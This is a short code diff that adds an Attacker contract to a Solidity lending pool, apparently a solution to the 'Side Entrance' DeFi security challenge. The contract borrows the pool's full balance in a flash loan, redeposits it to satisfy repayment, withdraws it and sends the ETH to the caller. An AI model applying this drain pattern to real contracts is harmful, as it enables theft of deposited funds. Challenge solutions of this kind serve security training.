@@ -45,3 +45,26 @@ contract SideEntranceLenderPool {
             revert RepayFailed();
     }
 }
+
+contract Attacker is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool immutable pool;
+    
+    constructor(address poolAddress) {
+        pool = SideEntranceLenderPool(poolAddress);
+    }
+    
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+    
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+    
+        pool.withdraw();
+    
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    // need `receive` for this contract to receive ETH
+    receive() external payable {}
+}
